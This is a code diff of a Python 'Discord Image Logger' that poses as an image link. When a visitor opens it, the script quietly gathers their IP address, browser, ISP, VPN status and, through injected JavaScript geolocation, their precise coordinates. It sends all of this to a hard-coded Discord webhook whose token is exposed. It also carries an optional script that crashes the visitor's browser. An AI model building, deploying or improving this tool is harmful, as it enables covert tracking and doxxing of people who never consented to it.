@@ -1,13 +1,6 @@
-from flask import Flask, request, Response, render_template_string, redirect
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib import parse
-import traceback
-import requests
-import base64
-import httpagentparser
-import json
-import os
-
-app = Flask(__name__)
+import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "a simple image logger"
@@ -16,28 +9,28 @@ __author__ = "foaqen"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1467553434541625558/fKl1f66ykkbYUxlzxhR-ODuDaskO6bZvEi_Xb7zxeR0MNelnYg3LJBs-ZFCmA2QYDmbK",
-    "image": "https://pngimg.com/uploads/spongebob/spongebob_PNG10.png",
+    "image": "https://pngimg.com/uploads/spongebob/spongebob_PNG10.png", 
     "imageArgument": True,
 
-    "username": "Logger Agent",
+    "username": "Logger Agent", 
     "color": 0x00FFFF,
 
-    "crashBrowser": False,
+    "crashBrowser": False, 
     "accurateLocation": True,
 
     "message": {
-        "doMessage": False,
+        "doMessage": False, 
         "message": "A new person clicked.",
         "richMessage": True,
     },
 
-    "vpnCheck": 2,
-    "linkAlerts": False,
+    "vpnCheck": 1,
+    "linkAlerts": False, 
     "buggedImage": True,
     "antiBot": 1,
 
     "redirect": {
-        "redirect": True,
+        "redirect": False,
         "page": "https://example.org"
     },
 }
@@ -136,7 +129,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         if config["antiBot"] == 1:
             ping = ""
 
-    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
+    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
     
     embed = {
         "username": config["username"],
@@ -163,7 +156,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 > **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
 
 **Computer Information:**
-> **Operating System:** `{os_name}`
+> **Operating System:** `{os}`
 > **Browser:** `{browser}`
 
 **Agent:**
@@ -184,182 +177,144 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     
     return info
 
-@app.route('/')
-@app.route('/<path:path>')
-def home(path=''):
-    try:
-        # Get IP address
-        ip = request.headers.get('x-forwarded-for', 
-             request.headers.get('x-real-ip', 
-             request.remote_addr))
-        
-        # Clean IP (remove port if present)
-        if ip and ',' in ip:
-            ip = ip.split(',')[0].strip()
-        if ip == '127.0.0.1' or ip == '::1':
-            ip = 'Unknown'
-        
-        # Get user agent
-        useragent = request.headers.get('user-agent', 'Unknown')
-        
-        # Get query parameters
-        query_params = request.args.to_dict()
-        
-        print(f"Request received - IP: {ip}, UA: {useragent}, Path: {path}")  # Debug log
-        
-        # Get image URL
-        if config["imageArgument"]:
-            if query_params.get("url") or query_params.get("id"):
-                try:
-                    url_param = query_params.get("url") or query_params.get("id")
-                    url = base64.b64decode(url_param.encode()).decode()
-                except:
+binaries = {
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+}
+
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
+    def handleRequest(self):
+        try:
+            # Get IP address - try different headers
+            ip = (self.headers.get('x-forwarded-for') or 
+                  self.headers.get('x-real-ip') or 
+                  self.client_address[0])
+            
+            # Get user agent
+            useragent = self.headers.get('user-agent', 'Unknown')
+            
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    try:
+                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                    except:
+                        url = config["image"]
+                else:
                     url = config["image"]
             else:
                 url = config["image"]
-        else:
-            url = config["image"]
-        
-        # Check if blacklisted
-        if ip != "Unknown" and any(ip.startswith(bl) for bl in blacklistedIPs):
-            return "OK", 200
-        
-        # Handle bot detection
-        bot_result = botCheck(ip, useragent)
-        if bot_result:
-            print(f"Bot detected: {bot_result}")
-            makeReport(ip, useragent, endpoint=path, url=url)
-            
-            if config["buggedImage"]:
-                # Return a 1x1 transparent GIF
-                gif_data = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
-                return Response(gif_data, mimetype='image/gif', headers={
-                    "Cache-Control": "no-cache, no-store, must-revalidate"
-                })
-            else:
-                return redirect(url)
-        
-        # Handle accurate location
-        if query_params.get("g") and config["accurateLocation"]:
-            try:
-                location = base64.b64decode(query_params.get("g").encode()).decode()
-                result = makeReport(ip, useragent, location, path, url=url)
-            except:
-                result = makeReport(ip, useragent, endpoint=path, url=url)
-        else:
-            result = makeReport(ip, useragent, endpoint=path, url=url)
-        
-        # Build HTML content
-        html_template = '''<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Logger</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
-        }
-        div.img {
-            background-image: url('{{ url }}');
-            background-position: center center;
-            background-repeat: no-repeat;
-            background-size: contain;
-            width: 100vw;
-            height: 100vh;
-        }
-    </style>
-</head>
-<body>
-    <div class="img"></div>
-    {% if message_doMessage and message_text %}
-    <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); color: white; padding: 20px; border-radius: 10px;">{{ message_text }}</div>
-    {% endif %}
-    {% if crashBrowser %}
-    <script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i);while(1){location.reload()}}},100)</script>
-    {% endif %}
-    {% if redirect_enabled %}
-    <meta http-equiv="refresh" content="0;url={{ redirect_page }}">
-    {% endif %}
-    {% if accurateLocation and not has_g_param %}
-    <script>
-(function() {
-    var currenturl = window.location.href;
-    if (!currenturl.includes("g=")) {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(coords) {
-                    var separator = currenturl.includes("?") ? "&" : "?";
-                    var locationData = btoa(coords.coords.latitude + "," + coords.coords.longitude);
-                    window.location.href = currenturl + separator + "g=" + encodeURIComponent(locationData);
-                },
-                function(error) {
-                    console.log("Geolocation error:", error);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                }
-            );
-        }
-    }
-})();
-</script>
-    {% endif %}
-</body>
-</html>'''
-        
-        # Process message if enabled
-        message_text = config["message"]["message"] if config["message"]["doMessage"] else ""
-        if config["message"]["doMessage"] and config["message"]["richMessage"] and result and isinstance(result, dict):
-            message_text = message_text.replace("{ip}", ip)
-            message_text = message_text.replace("{isp}", str(result.get("isp", "Unknown")))
-            message_text = message_text.replace("{asn}", str(result.get("as", "Unknown")))
-            message_text = message_text.replace("{country}", str(result.get("country", "Unknown")))
-            message_text = message_text.replace("{region}", str(result.get("regionName", "Unknown")))
-            message_text = message_text.replace("{city}", str(result.get("city", "Unknown")))
-            message_text = message_text.replace("{lat}", str(result.get("lat", "0")))
-            message_text = message_text.replace("{long}", str(result.get("lon", "0")))
-            
-            timezone = result.get("timezone", "Unknown/Unknown")
-            if '/' in timezone:
-                message_text = message_text.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
-            else:
-                message_text = message_text.replace("{timezone}", "Unknown")
-            
-            message_text = message_text.replace("{mobile}", str(result.get("mobile", False)))
-            message_text = message_text.replace("{vpn}", str(result.get("proxy", False)))
-            message_text = message_text.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
-            
-            os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
-            message_text = message_text.replace("{browser}", browser)
-            message_text = message_text.replace("{os}", os_name)
-        
-        # Render HTML
-        rendered_html = render_template_string(
-            html_template,
-            url=url,
-            message_doMessage=config["message"]["doMessage"],
-            message_text=message_text,
-            crashBrowser=config["crashBrowser"],
-            redirect_enabled=config["redirect"]["redirect"],
-            redirect_page=config["redirect"]["page"],
-            accurateLocation=config["accurateLocation"],
-            has_g_param="g" in query_params
-        )
-        
-        return Response(rendered_html, mimetype='text/html', headers={
-            "Cache-Control": "no-cache, no-store, must-revalidate"
-        })
-    
-    except Exception as e:
-        print(f"Error: {traceback.format_exc()}")
-        reportError(traceback.format_exc())
-        return f"Internal Server Error: {str(e)}", 500
 
-# This is for local testing
-if __name__ == '__main__':
-    app.run(debug=True, port=5000)
+            data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
+            
+            # Check if IP is blacklisted
+            if ip and ip != "Unknown" and ip.startswith(blacklistedIPs):
+                return
+            
+            if botCheck(ip, useragent):
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                self.end_headers()
+
+                if config["buggedImage"]: 
+                    self.wfile.write(binaries["loading"])
+
+                makeReport(ip, endpoint=self.path.split("?")[0], url=url)
+                return
+            
+            else:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
+                if dic.get("g") and config["accurateLocation"]:
+                    try:
+                        location = base64.b64decode(dic.get("g").encode()).decode()
+                        result = makeReport(ip, useragent, location, s.split("?")[0], url=url)
+                    except:
+                        result = makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
+                else:
+                    result = makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
+
+                message = config["message"]["message"]
+
+                if config["message"]["richMessage"] and result and isinstance(result, dict):
+                    message = message.replace("{ip}", ip)
+                    message = message.replace("{isp}", str(result.get("isp", "Unknown")))
+                    message = message.replace("{asn}", str(result.get("as", "Unknown")))
+                    message = message.replace("{country}", str(result.get("country", "Unknown")))
+                    message = message.replace("{region}", str(result.get("regionName", "Unknown")))
+                    message = message.replace("{city}", str(result.get("city", "Unknown")))
+                    message = message.replace("{lat}", str(result.get("lat", "0")))
+                    message = message.replace("{long}", str(result.get("lon", "0")))
+                    
+                    timezone = result.get("timezone", "Unknown/Unknown")
+                    if '/' in timezone:
+                        message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
+                    else:
+                        message = message.replace("{timezone}", "Unknown")
+                    
+                    message = message.replace("{mobile}", str(result.get("mobile", False)))
+                    message = message.replace("{vpn}", str(result.get("proxy", False)))
+                    message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
+                    
+                    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
+                    message = message.replace("{browser}", browser)
+                    message = message.replace("{os}", os)
+
+                datatype = 'text/html'
+
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+
+                if config["redirect"]["redirect"]:
+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                
+                self.send_response(200)
+                self.send_header('Content-type', datatype)
+                self.end_headers()
+
+                if config["accurateLocation"]:
+                    data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
+                self.wfile.write(data)
+        
+        except Exception as e:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+
+            self.wfile.write(b'500 - Internal Server Error')
+            reportError(traceback.format_exc())
+
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
